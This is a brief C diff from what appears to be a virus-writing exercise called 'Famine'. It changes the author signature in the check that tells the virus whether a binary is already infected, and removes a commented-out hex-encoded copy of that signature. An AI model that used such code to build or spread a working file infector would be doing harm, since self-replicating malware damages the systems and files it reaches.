@@ -91,9 +91,7 @@ static int search_signature(t_data *data, const char *key) {
 
 static int	already_patched(t_data data)
 {
-	char signature[] = "Famine (c)oded by Francis\n";
-	//char signature[] = "\x46\x61\x6d\x69\x6e\x65\x20\x63\x6f\x64\x65\x64\x20\x62\x79"
-	//	"\x20\x46\x72\x61\x6e\x63\x69\x73\x0a\x00";
+	char signature[] = "Famine (c)oded by dxrxbxk\n";
 	return search_signature(&data, signature) == 1;
 }
 
